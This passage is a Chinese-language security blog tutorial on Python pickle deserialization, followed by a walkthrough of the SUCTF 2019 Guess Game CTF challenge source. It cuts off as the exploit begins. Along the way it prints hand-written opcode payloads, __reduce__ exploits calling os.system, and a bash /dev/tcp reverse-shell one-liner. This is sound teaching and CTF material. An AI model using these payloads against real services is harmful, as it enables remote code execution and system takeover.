title="pickle指令码"></a>pickle指令码</h2><p><code>pickle.loads()</code>函数是我们用来反序列化一个对象的一个接口，底层实现是基于<code>_Unpickler</code>类</p><p><code>_Unpickler</code>类维护了两个东西：栈区和存储区。结构如下图：</p><img src="/2020/04/10/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/v2-5e2eeae4c4943c31aee406fa3b467301_720w.jpg" style="zoom:80%;"><p>　<strong>栈</strong>是unpickle机最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护最顶层的信息，<strong>最终留在栈顶的值将被作为反序列化对象返回</strong>，有的这部分博客上写的是<strong>指令处理器</strong>，而前序栈维护下层的信息，用来临时存储数据、参数以及对象。</p><p>　<strong>存储区</strong>可以类比内存，用于存取变量。它是一个数组，以下标为索引。它的每一个单元可以用来存储任何东西，大多数情况下我们并不需要这个存储区</p><p>看了其他人写的博客，发现对这三个名称叫法不尽相同，但表达的意思基本相似，就这样理解吧！</p><p>为了看的更清晰，我们可以使用Python提供的pickle调试器模块pickletools</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name = <span class="string">&quot;MoonBack&quot;</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span></span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">pickletools.dis(pickle.dumps(a))</span><br></pre></td></tr></table></figure><img src="/2020/04/10/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/TIM截图20200409203930.png" style="zoom: 67%;"><p>其实就是序列化结果的比较容易理解的形式，看着和汇编代码很像，在结果里面每一行就是一个指令码。</p><p>这些指令说明，全是英文就很难受，实在找不到就翻译</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">MARK           = <span class="string">b&#x27;(&#x27;</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b&#x27;.&#x27;</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b&#x27;0&#x27;</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b&#x27;1&#x27;</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b&#x27;2&#x27;</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line"><span class="keyword">FLOAT</span>          = <span class="string">b&#x27;F&#x27;</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line"><span class="keyword">INT</span>            = <span class="string">b&#x27;I&#x27;</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b&#x27;J&#x27;</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b&#x27;K&#x27;</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b&#x27;L&#x27;</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b&#x27;M&#x27;</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b&#x27;N&#x27;</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b&#x27;P&#x27;</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b&#x27;Q&#x27;</span>   <span class="comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span></span><br><span class="line">REDUCE         = <span class="string">b&#x27;R&#x27;</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line"><span class="keyword">STRING</span>         = <span class="string">b&#x27;S&#x27;</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b&#x27;T&#x27;</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b&#x27;U&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b&#x27;V&#x27;</span>   <span class="comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b&#x27;X&#x27;</span>   <span class="comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b&#x27;a&#x27;</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line"><span class="keyword">GLOBAL</span>         = <span class="string">b&#x27;c&#x27;</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b&#x27;d&#x27;</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b&#x27;&#125;&#x27;</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b&#x27;e&#x27;</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b&#x27;g&#x27;</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b&#x27;h&#x27;</span>   <span class="comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b&#x27;i&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b&#x27;j&#x27;</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line"><span class="keyword">LIST</span>           = <span class="string">b&#x27;l&#x27;</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b&#x27;]&#x27;</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b&#x27;o&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b&#x27;p&#x27;</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b&#x27;q&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b&#x27;r&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b&#x27;s&#x27;</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b&#x27;t&#x27;</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b&#x27;)&#x27;</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b&#x27;u&#x27;</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b&#x27;G&#x27;</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line">​</span><br><span class="line"><span class="literal">TRUE</span>           = <span class="string">b&#x27;I01\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line"><span class="literal">FALSE</span>          = <span class="string">b&#x27;I00\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br></pre></td></tr></table></figure><p>当前用于 pickling 的协议共有 5 种。使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新。</p><ul><li>v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。</li><li>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li><li>v2 版协议是在 Python 2.3 中引入的。它为存储 <a href="https://docs.python.org/zh-cn/3/glossary.html#term-new-style-class">new-style class</a> 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 <a href="https://www.python.org/dev/peps/pep-0307">PEP 307</a>。</li><li>v3 版协议添加于 Python 3.0。它具有对 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes">bytes</a> 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</li><li>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 <a href="https://www.python.org/dev/peps/pep-3154">PEP 3154</a>。</li></ul><p>0号版本是人类最可读的；之后的版本加入了一大堆不可打印字符，不过这些新加的东西都只是为了优化，本质上没有太大的改动。</p><p>一个好消息是，<strong>pickle协议是向前兼容的</strong>。0号版本的字符串可以直接交给pickle.loads()，不用担心引发什么意外。</p><p>折磨多好像没啥用，介绍几个常用的指令码：</p><ul><li>S : 后面跟的是字符串</li><li>I：后面跟的是整形</li><li>s：添加键值对到字典</li><li>( ：压入一个标志到栈中，表示元组的开始位置</li><li>t ：从栈顶开始，找到最上面的一个<code>(</code>，并将<code>(</code>到<code>t</code>中间的内容全部弹出，组成一个元组，再把这个元组压入栈中</li><li>c ：引入模块名和类名（模块名和类名之间使用回车分隔，find_class校验就在这一步）</li><li>R ：从栈顶弹出一个可执行对象和一个元组，元组作为函数的参数列表执行，并将返回值压入栈上</li><li>. ：点号是结束符</li><li>}：push一个空的字典</li></ul><p><strong>反序列化过程：</strong><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a></p><p><strong>手写指令码：</strong></p><p>基本模式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c&lt;module&gt;</span><br><span class="line">&lt;callable&gt;</span><br><span class="line">(&lt;args&gt;</span><br><span class="line">tR</span><br></pre></td></tr></table></figure><p>看个小例子：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">&#x27;ls&#x27;</span></span><br><span class="line">tR.</span><br><span class="line"></span><br><span class="line">&lt;=&gt; __import__(&#x27;os&#x27;).system(*(&#x27;ls&#x27;,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分解一下：</span></span><br><span class="line">cos</span><br><span class="line">system  =&gt;  引入 system，并将函数添加到 stack</span><br><span class="line"></span><br><span class="line">(S&#x27;ls&#x27;  =&gt;  把当前 stack 存到 metastack，清空 stack，再将 &#x27;ls&#x27; 压入 stack</span><br><span class="line">t       =&gt;  stack 中的值弹出并转为 tuple，把 metastack 还原到 stack，再将 tuple 压入 stack</span><br><span class="line"><span class="comment"># 简单来说，(,t 之间的内容形成了一个 tuple，stack 目前是 [&lt;built-in function system&gt;, (&#x27;ls&#x27;,)]</span></span><br><span class="line">R       =&gt;  system(*(&#x27;ls&#x27;,))</span><br><span class="line">.       =&gt;  结束，返回当前栈顶元素</span><br></pre></td></tr></table></figure><h2 id="reduce-方法"><a href="#reduce-方法" class="headerlink" title="__reduce__方法"></a><code>__reduce__</code>方法</h2><p>该方法在反序列化时自动调用</p><ul><li>如果返回值是一个字符串，那么将会去当前作用域中查找字符串值对应名字的对象，将其序列化之后返回，例如最后<code>return &#39;a&#39;</code>,那么它就会在当前的作用域中寻找名为<code>a</code>的对象然后返回，否则报错。</li><li>如果返回值是一个元组，要求是2到5个参数，第一个参数是可调用的对象，第二个是该对象所需的参数元组，剩下三个可选。所以比如最后<code>return (eval,(&quot;os.system(&#39;ls&#39;)&quot;,))</code>，那么就是执行eval函数，然后元组内的值作为参数，从而达到执行命令或代码的目的，当然也可以<code>return (os.system,(&#39;ls&#39;,))</code>。</li></ul><p>由此我们可以构造如下的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a=test()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure><p>然后我们无需导入os模块，无需有test类，就能代码执行</p><img src="/2020/04/10/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/TIM截图20200409210943.png" style="zoom:80%;"><p>同样，弹shell之类的也不在话下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        code=<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(code,))</span><br><span class="line">a=test()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line">print(c)</span><br><span class="line">pickle.loads(c)</span><br></pre></td></tr></table></figure><p><code>__reduce__</code>方法是新式类(内置类)特有的，在python2中要注意继承object类</p><h2 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a>真实案例</h2><p>P神的操作：<a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></p><p>Redis未授权访问+Python反序列化</p><h2 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h2><h3 id="SUCTF-2019-Guess-Game"><a href="#SUCTF-2019-Guess-Game" class="headerlink" title="[SUCTF 2019]Guess Game"></a>[SUCTF 2019]Guess Game</h3><p>题目地址：<a href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game">https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game</a></p><p>buu上有环境，列下关键的源码：</p><p><strong>game_client.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> banner</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_length</span>(<span class="params">obj</span>):</span></span><br><span class="line">    <span class="keyword">return</span> pack(<span class="string">&#x27;&gt;I&#x27;</span>, obj)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">start_client</span>(<span class="params">host, port</span>):</span></span><br><span class="line">    reader, writer = <span class="keyword">await</span> asyncio.open_connection(host, port)</span><br><span class="line">    print(banner)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        number = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> number == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                number = input(<span class="string">&#x27;Input the number you guess\n&gt; &#x27;</span>)</span><br><span class="line">                number = int(number)</span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                number = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        ticket = Ticket(number)</span><br><span class="line">        ticket = pickle.dumps(ticket)</span><br><span class="line">        writer.write(pack_length(len(ticket)))</span><br><span class="line">        writer.write(ticket)</span><br><span class="line">        response = <span class="keyword">await</span> reader.readline()</span><br><span class="line">        print(response.decode())</span><br><span class="line">    response = <span class="keyword">await</span> reader.readline()</span><br><span class="line">    print(response.decode())</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(start_client(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27628</span>))</span><br></pre></td></tr></table></figure><p>上面的代码的意思就是进行10次猜数，序列化并编码传输到服务端</p><p><strong>game_server.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game.RestrictedUnpickler <span class="keyword">import</span> restricted_loads</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> game</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span>():</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flag = f.read().strip()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_length</span>(<span class="params">obj</span>):</span></span><br><span class="line">    <span class="keyword">return</span> unpack(<span class="string">&#x27;&gt;I&#x27;</span>, obj)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stdin_read</span>(<span class="params">length</span>):</span></span><br><span class="line">    <span class="keyword">return</span> sys.stdin.buffer.read(length)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> game.finished():</span><br><span class="line">        length = stdin_read(<span class="number">4</span>)</span><br><span class="line">        length, = read_length(length)</span><br><span class="line">        ticket = stdin_read(length)</span><br><span class="line">        ticket = restricted_loads(ticket) <span class="comment"># 调用RestrictedUnpickler.restricted_loads()方法</span></span><br><span class="line">        <span class="keyword">assert</span> type(ticket) == Ticket</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ticket.is_valid():</span><br><span class="line">            print(<span class="string">&#x27;The number is invalid.&#x27;</span>)</span><br><span class="line">            game.next_game(Ticket(<span class="number">-1</span>))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        win = game.next_game(ticket)</span><br><span class="line">        <span class="keyword">if</span> win:</span><br><span class="line">            text = <span class="string">&quot;Congratulations, you get the right number!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            text = <span class="string">&quot;Wrong number, better luck next time.&quot;</span></span><br><span class="line">        print(text)</span><br><span class="line">    <span class="keyword">if</span> game.is_win():</span><br><span class="line">        text = <span class="string">&quot;Game over! You win all the rounds, here is your flag %s&quot;</span> % get_flag()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">&quot;Game over! You got %d/%d.&quot;</span> % (game.win_count, game.round_count)</span><br><span class="line">    print(text)</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    print(<span class="string">&#x27;Houston, we got a problem.&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这段代码是服务端的，接收传过来的数据并反序列化，判断反序列化的结果是不是Ticket类，是的话才会接着执行，game.is_win()成立才会给flag</p><p><strong>RestrictedUnpickler.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="comment"># Only allow safe classes</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;guess_game&quot;</span> == module[<span class="number">0</span>:<span class="number">10</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> getattr(sys.modules[module], name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure><p>这段代码的介绍参考：<a href="https://docs.python.org/zh-cn/3/library/pickle.html?highlight=__reduce#restricting-globals">https://docs.python.org/zh-cn/3/library/pickle.html?highlight=__reduce#restricting-globals</a></p><p>大概意思就是，为了防止pickle反序列化的危害，可以继承pickle.Unpickler实现find_class方法从而达到过滤部分模块方法的目的，该方法在使用该类时自动调用。</p><p>而在该题中，必须有guess_game里的类，而且过滤了<code>__</code>，<code>__reduce__</code>那种方法显然不能用了</p><p>看下Game.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> max_round, number_range</span><br><span class="line"><span class="comment"># max_round代表回合 number_range代表最大数</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        self.curr_ticket = Ticket(number)</span><br><span class="line">        self.round_count = <span class="number">0</span></span><br><span class="line">        self.win_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next_game</span>(<span class="params">self, ticket</span>):</span></span><br><span class="line">        win = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> self.curr_ticket == ticket:</span><br><span class="line">            self.win_count += <span class="number">1</span></span><br><span class="line">            win = <span class="literal">True</span></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        self.curr_ticket = Ticket(number)</span><br><span class="line">        self.round_count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> win</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">finished</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.round_count &gt;= max_round</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_win</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.win_count == max_round</span><br></pre></td></tr></table></figure><p>在<code>__init__.py</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">max_round = <span class="number">10</span></span><br><span class="line">number_range = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> guess_game.Game <span class="keyword">import</span> Game</span><br><span class="line"></span><br><span class="line">game = Game()</span><br></pre></td></tr></table></figure><p>这里虽然条件受限, 只能加载指定模块, 但是可以看到 <code>__init.py__</code> 中 <code>game = Game()</code>, 所以只要构造出 pickle 代码获得 guess_game.game对象, 然后修改 game 的 win_count 和 round_count 即可.<br>注意这里必须手写, 如果是 <code>from guess_game import game</code>, 然后修改再 dumps 这个 game 的话, 是在运行时重新新建一个 Game 对象, 而不是从 guess_game 这个 module 里面获取。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 